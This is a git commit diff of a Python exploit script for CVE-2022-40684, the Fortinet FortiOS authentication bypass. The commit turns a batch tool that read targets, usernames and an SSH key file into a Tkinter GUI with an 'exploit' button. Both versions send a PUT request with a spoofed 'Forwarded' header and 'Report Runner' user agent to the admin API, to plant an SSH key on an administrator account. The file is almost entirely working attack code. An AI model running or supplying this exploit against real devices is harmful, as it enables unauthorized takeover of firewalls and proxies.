05510d92d6c7a9b6cd903e144be396d654110bc1
ibrahim ali <82097150+abrahim7112@users.noreply.github.com>
2023-08-30 10:19:52 -0400

    Update CVE_2022_40684.py
    An authentication bypass using an alternate path or channel [CWE-288] in Fortinet FortiOS version 7.2.0 through 7.2.1 and 7.0.0 through 7.0.6, FortiProxy version 7.2.0 and version 7.0.0 through 7.0.6 and FortiSwitchManager version 7.2.0 and 7.0.0 allows an unauthenticated atttacker to perform operations on the administrative interface via specially crafted HTTP or HTTPS requests.
    
    
    Signed-off-by: ibrahim ali <82097150+abrahim7112@users.noreply.github.com>

--- xmlin/CVE_2022_40684.py
+++ xmlin/CVE_2022_40684.py
@@ -3,43 +3,61 @@ An authentication bypass using an alternate path or channel [CWE-288] in Fortine
 '''
 import requests
 import argparse
-
-# Read the input arguments
-parser = argparse.ArgumentParser()
-parser.add_argument("-t", "--targets", help="Targets file")
-parser.add_argument("-u", "--usernames", help="Usernames file")
-parser.add_argument("--key", help="id_rsa.pub file")
-args = parser.parse_args()
-
-# Read targets
-with open(args.targets, "r") as f:
-    targets = f.read().splitlines()
-
-# Read usernames
-with open(args.usernames, "r") as f:
-    usernames = f.read().splitlines()
-
-# Read id_rsa.pub
-with open(args.key, "r") as f:
-    ssh_public_key = f.read()
+import tkinter
+from tkinter import *
+import tkinter as tk
+from tkinter.ttk import *
+from time import strftime
+from tkinter import ttk
+def unauthenticated():
+    root = tkinter.Tk()
+    root.title("CVE-2022-40684 exploits")
+    root.geometry('800x600+0+0')
+    def printInput():
+        inp = inputtxt.get(1.0, "end-1c")
+        lbl.config(text = "attack url : "+inp)
+        target = inp
+        username = "root"
+        ssh_public_key = "01212000"
 
 # Prepare headers
-headers = {
-    'User-Agent': 'Report Runner',
-    'Content-Type': 'application/json',
-    'Forwarded': 'for="[127.0.0.1]:8000";by="[127.0.0.1]:9000";'
-}
+        headers = {
+            'User-Agent': 'Report Runner',
+            'Content-Type': 'application/json',
+            'Forwarded': 'for="[127.0.0.1]:8000";by="[127.0.0.1]:9000";'
+        }
 
 # Prepare data
-data = {
-    "ssh-public-key1": ssh_public_key
-}
+        data = {
+            "ssh-public-key1": ssh_public_key
+        }
 
-for target in targets:
-    for username in usernames:
         url = f"{target}/api/v2/cmdb/system/admin/{username}"
         response = requests.put(url, headers=headers, json=data)
         if response.status_code == 200 and 'SSH' in response.text:
-            print(f"[+] Successful exploit for {username} at {url}")
+            scroll_y = Scrollbar(root, orient=VERTICAL)
+            txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
+            scroll_y.pack(side=RIGHT, fill=Y)
+            scroll_y.config(command=txtarea.yview)
+            txtarea.insert(END, f"[+] Successful exploit for {username} at {url}")
+            txtarea.insert(END, "\n----------------------------------------------------------------------------------\n")
+            txtarea.pack(fill=BOTH, expand=True)
+            txtarea.configure(state ='disabled')
         else:
-            print(f"[-] Failed exploit for {username} at {url}")
+            scroll_y = Scrollbar(root, orient=VERTICAL)
+            txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
+            scroll_y.pack(side=RIGHT, fill=Y)
+            scroll_y.config(command=txtarea.yview)
+            txtarea.insert(END, f"[-] Failed exploit for {username} at {url}")
+            txtarea.insert(END, "\n----------------------------------------------------------------------------------\n")
+            txtarea.pack(fill=BOTH, expand=True)
+            txtarea.configure(state ='disabled')
+
+    Hacher = Label(root, text="An authentication bypass using an alternate path or channel [CWE-288] in Fortinet FortiOS\n version 7.2.0 through 7.2.1 and 7.0.0 through 7.0.6, FortiProxy version 7.2.0 and version 7.0.0 through\n 7.0.6 and FortiSwitchManager version 7.2.0 and 7.0.0 allows an unauthenticated atttacker to perform operations\n on the administrative interface via specially crafted HTTP or HTTPS requests.\n\nEnter url or domin https://www.example.com : ").pack()
+    inputtxt = tk.Text(root,height = 1,width = 80)
+    inputtxt.pack()
+    printButton = tk.Button(root,text = "exploit", command = printInput)
+    printButton.pack()
+    lbl = tk.Label(root, text = "")
+    lbl.pack()
+    root.mainloop()
